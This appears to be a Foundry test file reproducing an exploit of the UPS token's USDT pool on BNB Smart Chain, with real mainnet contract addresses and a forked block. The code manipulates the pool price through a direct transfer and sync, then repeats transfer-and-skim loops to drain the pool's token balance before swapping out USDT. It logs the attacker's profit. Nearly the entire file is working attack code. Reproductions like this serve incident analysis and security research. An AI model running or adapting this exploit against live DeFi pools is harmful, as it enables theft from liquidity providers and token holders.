// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IPancakeV3.sol";

import "./IUps.sol";

IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

IUps constant UPSToken = IUps(0x3dA4828640aD831F3301A4597821Cc3461B06678);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

IPancakePairV2 constant UPS_USDT_Pool = IPancakePairV2(
    0xA2633ca9Eb7465E7dB54be30f62F577f039a2984
);

// USDT/USDC
IPancakePairV3 constant USDT_USDC_Pool = IPancakePairV3(
    0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb
);

contract UpsTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 37680755 - 1);
        deal(address(USDT), address(this), 2200000 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("Pool USDT", USDT.balanceOf(address(UPS_USDT_Pool)), 18);
        print(
            "[Begin] Attacker USDT before exploit",
            USDT.balanceOf(address(this)) - 2200000 ether,
            18
        );

        fuckyou();

        print(
            "[End] Attacker USDT after exploit",
            USDT.balanceOf(address(this)) - 2200000 ether,
            18
        );
    }

    function SwapToken(address a, address b, uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function fuckyou() public {
        USDT.approve(address(PancakeV2Router), type(uint256).max);
        // price ->
        // 0.000012738946733044 current
        // 0.000500000000000000  < require

        // for the require(canBuy || getPrice() > 5e14, "can not trade");
        USDT.transfer(address(UPS_USDT_Pool), 1200000 ether);
        UPS_USDT_Pool.sync();

        // price -> 0.000517604905867042
        // Pool UPS balance -> 23 7092 6337.655292500467902758
        // Pool USDT balance -> 123 0278.801339419793360994

        // then can swap
        SwapToken(address(USDT), address(UPSToken), 1000000 ether);

        // price -> 0.001699114028599183
        // My   UPS balance -> 10 6159 5083.133582563193842493 ether
        // Pool UPS balance -> 13 0933 1254.521709937274060265 ether

        // change price
        uint256 i = 0;
        uint256 pair_balance = 0;
        uint256 here_balance = 0;
        uint256 transfer_amount = 0;
        while (i < 10) {
            pair_balance = UPSToken.balanceOf(address(UPS_USDT_Pool));
            here_balance = UPSToken.balanceOf(address(address(this)));
            // console.log(">>>>", here_balance, pair_balance, "<<<<");
            transfer_amount = here_balance > pair_balance
                ? pair_balance
                : here_balance;
            UPSToken.transfer(address(UPS_USDT_Pool), transfer_amount);
            UPS_USDT_Pool.skim(address(this));
            i++;
        }

        // Pool UPS price 0.001699114028599183 -> 2228965.932350643357914207
        // Pool UPS balance: 0.000587531104579700
        // Pool USDT balance: 223 0278.801339419793360994

        i = 0;
        while (i < 5) {
            transfer_amount = UPSToken.balanceOf(address(UPS_USDT_Pool));
            UPSToken.transfer(address(UPS_USDT_Pool), transfer_amount);
            (uint256 r0, uint256 r1, ) = UPS_USDT_Pool.getReserves();
            uint256 amountOut = PancakeV2Router.getAmountOut(
                transfer_amount - r0,
                r0,
                r1
            );
            UPS_USDT_Pool.swap(0, amountOut, address(this), "");
            i++;
        }
    }
}
